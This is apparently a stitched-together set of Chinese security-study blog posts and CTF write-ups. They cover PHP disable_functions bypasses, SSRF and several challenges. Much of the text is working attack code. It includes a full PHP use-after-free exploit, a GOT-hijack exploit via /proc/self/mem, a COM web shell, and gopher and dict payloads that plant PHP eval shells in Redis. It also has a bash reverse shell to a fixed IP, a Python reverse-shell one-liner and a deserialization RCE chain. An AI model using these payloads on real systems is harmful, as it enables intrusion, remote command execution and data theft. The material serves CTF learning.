versions to date PHP7.3 7.3.15 (released 20 Feb 2020) PHP7.4 7.4.3 (released 20 Feb 2020) 攻击exp： ?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(uname -a);function pwn($cmd) global $abc, $helper, $backtrace; class Vuln public $a; public function __destruct() global $backtrace; unset($this-a); $backtrace = (new Exception)-getTrace(); # ;) if(!isset($backtrace[1][args])) # PHP = 7.4 $backtrace = debug_backtrace(); class Helper public $a, $b, $c, $d; function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; function leak($addr, $p = 0, $s = 8) global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-a); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; function parse_elf($base) $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = leak($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return leak($addr + 8); $addr += 0x20; while($f_entry != 0); return false; function trigger_uaf($arg) # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(A, 79)); $vuln = new Vuln(); $vuln-a = $arg; if(stristr(PHP_OS, WIN)) die(This PoC is for *nix systems only.); $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(A, 79)); trigger_uaf(x); $abc = $backtrace[1][args][0]; $helper = new Helper; $helper-b = function ($x) ; if(strlen($abc) == 79 || strlen($abc) == 0) die(UAF failed); # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) die(Couldnt determine binary base address); if(!($elf = parse_elf($base))) die(Couldnt parse ELF header); if(!($basic_funcs = get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); if(!($zif_system = get_system($basic_funcs))) die(Couldnt get zif_system address); # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i 0x110; $i += 8) write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-b)($cmd); exit(); antsword也有插件 labs可以复现这个漏洞 concat operation UAF劫持got表使用条件： nginx-1.18下：php5.5,php5.4,php5.3,php5.2是可以的 php5.6及以上会出现 fopen(procselfmem): failed to open stream: Permission denied apache2.4下：php5.5,php5.4,php5.3是可以的 php5.6及以上会出现 fopen(procselfmem): failed to open stream: Permission denied 概念以及攻击原理： 参考https://cloud.tencent.com/developer/article/2318123 在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。简单说就是，函数第一次用到的时候才会把在自己的真实地址给写到相应的got表里，没用到就不绑定了。这就是延迟绑定，由于这个机制，第一次调用函数的时候，got表中“存放”的地址不是函数的真实地址，而是plt 表中的第二条汇编指令，接下来会进行一系列操作装载相应的动态链接库，将函数的真实地址写在got表中。以后调用该函数时，got表保存着其真实地址。这里劫持got表就是修改函数的got表的地址的内容为我们的shellcode的地址step 1:通过php脚本解析/proc/self/exe得到open函数的got表的地址。step 2:通过读取/proc/self/maps得到程序基地址，栈地址，与libc基地址。step 3:通过php脚本解析libc得到system函数的地址，结合libc基地址（两者相加）可以得到system函数的实际地址。step 4:通过读写/proc/self/mem实现修改open函数的got表的地址的内容为我们的shellcode的地址。向我们指定的shellcode的地址写入我们的shellcode。 exp（命令无回显，如果没有权限读写procselfmem，自然也就无法利用了） step1:通过php脚本解析procselfexe得到open函数的got表的地址 step 2:通过读取procselfmaps得到程序基地址，栈地址，与libc基地址。 step 3:通过php脚本解析libc得到system函数的地址，结合libc基地址（两者相加）可以得到system函数的实际地址。 step 4:通过读写procselfmem实现修改open函数的got表的地址的内容为我们的shellcode的地址。向我们指定的shellcode的地址写入我们的shellcode。 总而言之就是修改got表的地址，修改其为我们shellcode的地址。 exp： ?php /*** ** BUG修正请联系我* @author* @email xiaozeend@pm.me **//*section tables type*/define(SHT_NULL,0);define(SHT_PROGBITS,1);define(SHT_SYMTAB,2);define(SHT_STRTAB,3);define(SHT_RELA,4);define(SHT_HASH,5);define(SHT_DYNAMIC,6);define(SHT_NOTE,7);define(SHT_NOBITS,8);define(SHT_REL,9);define(SHT_SHLIB,10);define(SHT_DNYSYM,11);define(SHT_INIT_ARRAY,14);define(SHT_FINI_ARRAY,15);//why does section tables have so many fuck typedefine(SHT_GNU_HASH,0x6ffffff6);define(SHT_GNU_versym,0x6fffffff);define(SHT_GNU_verneed,0x6ffffffe);class elf private $elf_bin; private $strtab_section=array(); private $rel_plt_section=array(); private $dynsym_section=array(); public $shared_librarys=array(); public $rel_plts=array(); public function getElfBin() return $this-elf_bin; public function setElfBin($elf_bin) $this-elf_bin = fopen($elf_bin,rb); public function unp($value) return hexdec(bin2hex(strrev($value))); public function get($start,$len) fseek($this-elf_bin,$start); $data=fread ($this-elf_bin,$len); rewind($this-elf_bin); return $this-unp($data); public function get_section($elf_bin=) if ($elf_bin) $this-setElfBin($elf_bin); $this-elf_shoff=$this-get(0x28,8); $this-elf_shentsize=$this-get(0x3a,2); $this-elf_shnum=$this-get(0x3c,2); $this-elf_shstrndx=$this-get(0x3e,2); for ($i=0;$i$this-elf_shnum;$i+=1) $sh_type=$this-get($this-elf_shoff+$i*$this-elf_shentsize+4,4); switch ($sh_type) case SHT_STRTAB: $this-strtab_section[$i]= array( strtab_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), strtab_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8) ); break; case SHT_RELA: $this-rel_plt_section[$i]= array( rel_plt_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), rel_plt_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8), rel_plt_entsize=$this-get($this-elf_shoff+$i*$this-elf_shentsize+56,8) ); break; case SHT_DNYSYM: $this-dynsym_section[$i]= array( dynsym_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), dynsym_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8), dynsym_entsize=$this-get($this-elf_shoff+$i*$this-elf_shentsize+56,8) ); break; case SHT_NULL: case SHT_PROGBITS: case SHT_DYNAMIC: case SHT_SYMTAB: case SHT_NOBITS: case SHT_NOTE: case SHT_FINI_ARRAY: case SHT_INIT_ARRAY: case SHT_GNU_versym: case SHT_GNU_HASH: break; default: // echo who knows what $sh_type this is? ; public function get_reloc() $rel_plts=array(); $dynsym_section= reset($this-dynsym_section); $strtab_section=reset($this-strtab_section); foreach ($this-rel_plt_section as $rel_plt ) for ($i=$rel_plt[rel_plt_offset];$i$rel_plt[rel_plt_offset]+$rel_plt[rel_plt_size];$i+=$rel_plt[rel_plt_entsize]) $rel_offset=$this-get($i,8); $rel_info=$this-get($i+8,8)32; $fun_name_offset=$this-get($dynsym_section[dynsym_offset]+$rel_info*$dynsym_section[dynsym_entsize],4); $fun_name_offset=$strtab_section[strtab_offset]+$fun_name_offset-1; $fun_name=; while ($this-get(++$fun_name_offset,1)!=) $fun_name.=chr($this-get($fun_name_offset,1)); $rel_plts[$fun_name]=$rel_offset; $this-rel_plts=$rel_plts; public function get_shared_library($elf_bin=) if ($elf_bin) $this-setElfBin($elf_bin); $shared_librarys=array(); $dynsym_section=reset($this-dynsym_section); $strtab_section=reset($this-strtab_section); for($i=$dynsym_section[dynsym_offset]+$dynsym_section[dynsym_entsize];$i$dynsym_section[dynsym_offset]+$dynsym_section[dynsym_size];$i+=$dynsym_section[dynsym_entsize]) $shared_library_offset=$this-get($i+8,8); $fun_name_offset=$this-get($i,4); $fun_name_offset=$fun_name_offset+$strtab_section[strtab_offset]-1; $fun_name=; while ($this-get(++$fun_name_offset,1)!=) $fun_name.=chr($this-get($fun_name_offset,1)); $shared_librarys[$fun_name]=$shared_library_offset; $this-shared_librarys=$shared_librarys; public function close() fclose($this-elf_bin); public function __destruct() $this-close(); public function packlli($value) $higher = ($value 0xffffffff00000000) 32; $lower = $value 0x00000000ffffffff; return pack(V2, $lower, $higher); $test=new elf();$test-get_section(/proc/self/exe);$test-get_reloc(); // 获得各函数的got表的地址$open_php=$test-rel_plts[open];$maps = file_get_contents(/proc/self/maps);preg_match(/(\\w+)-(\\w+)\\s+.+\\[stack]/, $maps, $stack);preg_match(/(\\w+)-(\\w+).*?libc-/,$maps,$libcgain);$libc_base = 0x.$libcgain[1];echo Libc base: .$libc_base. ;echo Stack location: .$stack[1]. ;$array_tmp = explode(-,$maps);$pie_base = hexdec(0x.$array_tmp[0]);echo PIE base: .$pie_base. ;$test2=new elf();$test2-get_section(/usr/lib64/libc-2.17.so);$test2-get_reloc();$test2-get_shared_library(); // 解析libc库，得到libc库函数的相对地址$sys = $test2-shared_librarys[system];$sys_addr = $sys + hexdec($libc_base);echo system addr:.$sys_addr. ;$mem = fopen(/proc/self/mem,wb);$shellcode_loc = $pie_base + 0x2333;fseek($mem,$open_php);fwrite($mem,$test-packlli($shellcode_loc));$command=$_GET[cmd]; // 我们要执行的命令$stack=hexdec(0x.$stack[1]);fseek($mem, $stack);fwrite($mem, $command\\x00);$cmd = $stack;$shellcode = H\\xbf.$test-packlli($cmd).H\\xb8.$test-packlli($sys_addr).P\\xc3;fseek($mem,$shellcode_loc);fwrite($mem,$shellcode);readfile(zxhy);// highlight_file(zxhy);// show_source(zxhy);// file_get_contents(zxhy);exit(); Windows 组件 COM使用条件： 开启com.allow_dcom 创建一个COM对象,通过调用COM对象的exec替我们执行命令 ?php$wsh = isset($_GET[wsh]) ? $_GET[wsh] : wscript;if($wsh == wscript) $command = $_GET[cmd]; $wshit = new COM(WScript.shell) or die(Create Wscript.Shell Failed!); $exec = $wshit-exec(cmd /c.$command); $stdout = $exec-StdOut(); $stroutput = $stdout-ReadAll(); echo $stroutput;elseif($wsh == application) $command = $_GET[cmd]; $wshit = new COM(Shell.Application) or die(Shell.Application Failed!); $exec = $wshit-ShellExecute(cmd,/c .$command); else echo(0);? 上传访问执行命令即可","tags":["Study-Note"]},{"title":"SSRF","path":"/2025/08/29/SSRF/","content":"SSRF概念SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，本质上是属于信息泄露漏洞。 漏洞原理服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制，比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等，而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。 常见漏洞函数file_get_contents()curl_exec()fsockopen()fopen()协议http(s):基础http://target.com/fetch?url=http://internal-service/adminhttps://target.com/fetch?url=https://internal-service/config 升级1.HTTP重定向 # 设置一个重定向到内部服务的外部服务http://target.com/fetch?url=http://attacker.com/redirect# attacker.com返回302重定向到http://internal-service/ 2.HTTP请求走私 在某些情况下，可以在HTTP请求中嵌入额外的HTTP请求 http://target.com/fetch?url=http://external-service/X-Forwarded-For: internal-service 3.HTTP认证 http://target.com/fetch?url=http://user:password@internal-service/ file:访问服务器本地文件系统 1.路径遍历 http://target.com/fetch?url=file:///var/www/html/../../../etc/shadow 2.特殊文件 http://target.com/fetch?url=file:///proc/self/environhttp://target.com/fetch?url=file:///proc/self/cmdline 3.列目录 某些情况下可用 http://target.com/fetch?url=file:///var/www/html/ dict:dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在SSRF中如果可以使用dict协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息。 1.Redis命令执行：利用dict协议与Redis服务交互 2.Memcached数据提取：访问Memcached服务获取缓存数据。 gopher:很强大的协议，在SSRF中经常会使用Gopher来构造GETPOST包攻击应用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache。 ftp:用于与FTP服务器交互 http://target.com/fetch?url=ftp://user:pass@192.168.1.10/ Bypass利用[::]http://[::]:80/ http://127.0.0.1 利用@http://example.com@127.0.0.1 利用短地址http://dwz.cn/11SMa http://127.0.0.1 利用302跳转自己服务器上vim一个index.php ?phpheader(Location:http://127.0.0.1/flag.php); 然后payload访问自己这个地址就可以了。 利用DNS重绑定DNS 重绑定是一种特定的技术，通常用于绕过 同源策略（Same-Origin Policy）。攻击者会通过操控 DNS 解析过程，伪装自己的域名，使其解析到受害者的内网 IP（例如 127.0.0.1 或 192.168.x.x）或云服务地址。这样，攻击者便能利用此技术攻击目标网络，执行多种漏洞利用方式 参考文章通过 DNS 重绑定的 SSRF 攻击内部云服务_dns rebinding-CSDN博客 https://lock.cmpxchg8b.com/rebinder.html 利用进制转换八进制 在访问的时候加0表示使用八进制 http://0177.0000.0000.0001 十进制 http://2130706433 十六进制 访问加0x http://0x7f000001 利用特殊地址http://0/http://0.0.0.0http://127.0000000000000.001/flag.phphttp://127.1/flag.php 利用句号绕过http://127。0。0。1/flag.php 利用IPv6有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 [::] 0000::1 或IPv6的内网域名来绕过过滤。 利用IDN一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。在这些字符中，部分字符会在访问时做一个等价转换，例如 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 和 example.com 等同。利用这种方式，可以用 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ 等字符绕过内网限制。 绕过特定结尾开头?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if(preg_match(/^http:\\/\\/ctf\\..*show$/i,$url)) echo file_get_contents($url); url=http://ctf.@127.0.0.1/flag.php#show 漏洞利用读取本地文件file或者load_file file:etcpasswd这种 SSRF绕过技巧文章:https://sauy.top/2025/08/04/SSRF%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/ 探测内网端口dict://127.0.0.1:22dict://127.0.0.1:6379/info RedisRedis一般都是绑定在6379端口.如果没有设置口令（默认是无),攻击者就可以通过SSRF漏洞未授权访问内网Redis 未授权1.定时任务来反弹shell burp里操作 # 清空 keydict://172.72.23.27:6379/flushall# 设置要操作的路径为定时任务目录dict://172.72.23.27:6379/config set dir /var/spool/cron/# 在定时任务目录下创建 root 的定时任务文件dict://172.72.23.27:6379/config set dbfilename root# 写入 Bash 反弹 shell 的 payloaddict://172.72.23.27:6379/set x * * * * * /bin/bash -i %26 /dev/tcp/47.109.207.123/2333 0%261 # 保存上述操作dict://172.72.23.27:6379/save 2.gopher import urllib.parseprotocol = gopher://ip = 172.72.23.27port = 6779shell = ?php eval($_POST[\\f4ke\\]);? filename = 5he1l.phppath = /var/www/htmlpasswd = cmd = [flushall, set 1 .format(shell.replace( ,$IFS)), config set dir .format(path), config set dbfilename .format(filename), save, quit ]if passwd: cmd.insert(0,AUTH .format(passwd))payload = protocol + ip + : + port + /_def redis_format(arr): CRLF = \\r redis_arr = arr.split( ) cmd = cmd += * + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + $ + str(len((x.replace($IFS, )))) + CRLF + x.replace($IFS, ) cmd += CRLF return cmdif __name__==__main__: for x in cmd: payload += urllib.parse.quote(redis_format(x)) # print(payload) print(urllib.parse.quote(payload)) 弱认证url=dict://172.72.23.28:6379/auth P@ssw0rd 使用脚本 import urllib.parseprotocol = gopher://ip = 172.72.23.28port = 6379shell = ?php eval($_GET[1]);? filename = 2333.phppath = /var/www/htmlpasswd = P@ssw0rd# Redis 命令链（每个命令是一个列表，不要拼成字符串）cmd = [ [flushall], [set, x, shell], [config, set, dir, path], [config, set, dbfilename, filename], [save], [quit]]# 如果需要密码验证if passwd: cmd.insert(0, [AUTH, passwd])def redis_format(arr): CRLF = \\r cmd = * + str(len(arr)) + CRLF for arg in arr: cmd += $ + str(len(arg)) + CRLF + arg + CRLF return cmdif __name__ == __main__: payload = protocol + ip + : + port + /_ for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(payload) 然后 url=http://172.72.23.28/2333.php?1=system(ls); 执行命令即可 MYSQL查询数据MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证；但是当无需密码认证时直接发送 TCP/IP 数据包即可。所以这种情况下是可以直接利用 SSRF 漏洞攻击 MySQL 的。因为使用 gopher 协议进行攻击需要原始的 MySQL 请求的 TCP 数据包 def results(s): a=[s[i:i+2] for i in range(0,len(s),2)] return gopher://172.72.23.29:3306/_%+%.join(a)if __name__==__main__: s = a100000185a23f0000000001080000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033530380f5f636c69656e745f76657273696f6e06352e362e3531095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420313d0000000373656c656374202a2066726f6d20666c61672e7465737420756e696f6e2073656c656374207573657228292c277777772e73716c7365632e636f6d270100000001 print(results(s)) gopher://172.72.23.29:3306/_%a1%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%35%30%38%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%3d%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%2e%74%65%73%74%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%75%73%65%72%28%29%2c%27%77%77%77%2e%73%71%6c%73%65%63%2e%63%6f%6d%27%01%00%00%00%01 UDF提权SSRF攻击MySQL仅仅查询数据意义不大，不如直接UDF提权然后反弹shell出来更加直接 UDF (User Defined Function) 是 MySQL 的一个扩展机制，可以让数据库加载外部动态链接库（Linux 下是 .so，Windows 下是 .dll），注册成函数，然后就能在 SQL 语句里调用。 首先你要先知道mysql的插件目录 gopher://172.72.23.29:3306/_%a2%00%00%01%85%a2%3f%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%65%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%33%35%35%34%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%36%2e%35%31%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%0a%27%25%70%6c%75%67%69%6e%25%27%01%00%00%00%01 可知插件目录为 usrlibmysqlplugin 这里还可以使用一个工具 https://github.com/tarunkant/Gopherus python2环境 fpm（FastCGI协议）详细原理文章Fastcgi协议分析 PHP-FPM未授权访问漏洞 Exp编写 | 离别歌 可以使用上述的工具 具体操作： gopherus --exploit fastcgi 即可打通","tags":["CTF学习"]},{"title":"NSS4th-wp","path":"/2025/08/24/NSS4th/","content":"sigininMongoDB注入 POST /search HTTP/1.1Host: node9.anna.nssctf.cn:28628Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://node9.anna.nssctf.cn:28628/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1754295247Connection: closeContent-Length: 73Content-Type:application/json title: $ne: null , author: $ne: null ez_upload传文件发现什么东西都没回显 提示上传zip 尝试 软链接 参考文章 https://blog.csdn.net/qq_44640313/article/details/130968721 依次上传1.zip和2.zip 访问创造的1.php phpinfo环境变量有一个flag 这里flag也有一个 出题不删环境变量qaq ez_crccrc碰撞 问ai ai写脚本 最后给出一个 Po_QyFcIoCVviMA [mpga]filesystem下载文件www.zip 里面有源码 反序列化 rce即可 ?phpclass ApplicationContext public $contextName; class ContentProcessor private $processedContent; public $callbackFunction = system; public function __construct() $this-processedContent = new FunctionInvoker(); class FileManager public $targetFile; public $responseData;class FunctionInvoker public $functionName; public $functionArguments; $a = new ApplicationContext();$a - contextName = new FileManager();$a - contextName - targetFile = new ContentProcessor();echo urlencode(serialize($a));//O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A2%3A%7Bs%3A12%3A%22functionName%22%3BN%3Bs%3A17%3A%22functionArguments%22%3BN%3B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3BN%3B%7D%7Dfile_to_check=O%3A18%3A%22ApplicationContext%22%3A1%3A%7Bs%3A11%3A%22contextName%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A2%3A%7Bs%3A12%3A%22functionName%22%3BN%3Bs%3A17%3A%22functionArguments%22%3BN%3B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3BN%3B%7D%7Dsubmit_md5=1method=performWriteOperationvar=processedContentcmd=cat /flag","tags":["CTF-wp"]},{"title":"LILCTF 2025","path":"/2025/08/19/LilCTF2025/","content":"Ekko_note审计源码 大概思路就是:有一个管理员面板 admin才能访问并且要到2066年以后才可以访问 admin通过session伪造 时间api可以修改 注册账号，登录后伪造admin的session进去 python flask_session_cookie_manager3.py encode -s your-secret-key-here -t is_admin: True, user_id: 1, username: admin 在服务器起一个api服务，修改api为服务器的api from flask import Flask, jsonifyapp = Flask(__name__)@app.route(/time)def fake_time(): return jsonify(date:2066-08-15 16:14:34,weekday:星期五,timestamp:1755245674,remark:任何情况请联系QQ:3295320658 微信服务号:顺成网络)if __name__ == __main__: app.run(host=0.0.0.0, port=2333) 修改api后进入面板 直接执行命令没有回显 试反弹shell python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((your_ip,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/sh) ez_bottle在upload上传文件 绕过黑名单 [, , os, eval, exec, sock, , , bul, class, ?, :, bash, _, globals, get, open] 使用了setattr的python函数 setattr(obj, name, value) % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) 大意就是把Bottle 模板引擎在什么目录下搜索模板文件改为了根目录 然后include了flag文件 写脚本上传压缩包，压缩包里面是包含bottle语句的txt文件 import ioimport zipfileimport requestsdef make_zip_payload() - io.BytesIO: txt = % import bottle % setattr(bottle, TEMPLATE + chr(95) + PATH, [/]) % include(flag) buf = io.BytesIO() with zipfile.ZipFile(buf, w, zipfile.ZIP_DEFLATED) as z: z.writestr(exploit, txt) buf.seek(0) return bufdef upload_zip_file(target_url: str): zbuf = make_zip_payload() files = file: (exploit.zip, zbuf, application/zip) print(f[*] 正在上传恶意ZIP文件到 target_url...) try: r = requests.post( target_url, files=files, timeout=20, headers=User-Agent: Mozilla/5.0 ) if r.status_code == 200: print([+] 文件上传成功！) print([*] 服务器响应:, r.text[:300]) else: print(f[!] 上传失败，状态码: r.status_code) print([!] 错误响应:, r.text[:300]) except Exception as e: print(f[!] 上传过程中发生错误: str(e))if __name__ == __main__: TARGET_UPLOAD_URL = http://challenge.xinshi.fun:40967/upload upload_zip_file(TARGET_UPLOAD_URL) print([*] 上传完成 ) 访问上传的文件，得到flag Your Uns3r?phphighlight_file(__FILE__);class User public $username; public $value; public function exec() $ser = unserialize(serialize(unserialize($this-value))); if ($ser != $this-value $ser instanceof Access) include($ser-getToken()); public function __destruct() if ($this-username == admin) $this-exec(); class Access protected $prefix; protected $suffix; public function getToken() if (!is_string($this-prefix) || !is_string($this-suffix)) throw new Exception(Go to HELL!); $result = $this-prefix . lilctf . $this-suffix; if (strpos($result, pearcmd) !== false) throw new Exception(Can I have peachcmd?); return $result; $ser = $_POST[user];if (strpos($ser, admin) !== false strpos($ser, Access:) !== false) exit (no way!!!!);$user = unserialize($ser);throw new Exception(nonono!!!); 这道题出得很好(赞 1.是抛出错误 使用gc回收机制来绕过 这样就可以触发__destruct__魔术方法绕过抛出错误 2.是admin和Acess的绕过 只要不同时出现就好 Acess是类名 使用大小写绕过 3.$result $this-prefix . ‘lilctf’ . $this-suffix 绕过这个lilctf使用..来绕过 4.unserialize(serialize(unserialize($this-value))) value赋值为serialize($b)就行 ?phpclass User public $username=admin; public $value;class Access protected $prefix=php://filter/convert.base64-encode/resource=/; protected $suffix=/../flag;$a = new User();$b = new Access();$a-value = serialize($b);$c=array(a=$a,b=NULL);echo urlencode(serialize($c)); 生成: a%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22value%22%3Bs%3A117%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A45%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A8%3A%22%2F..%2Fflag%22%3B%7D%22%3B%7Ds%3A1%3A%22b%22%3BN%3B%7D 把最后的 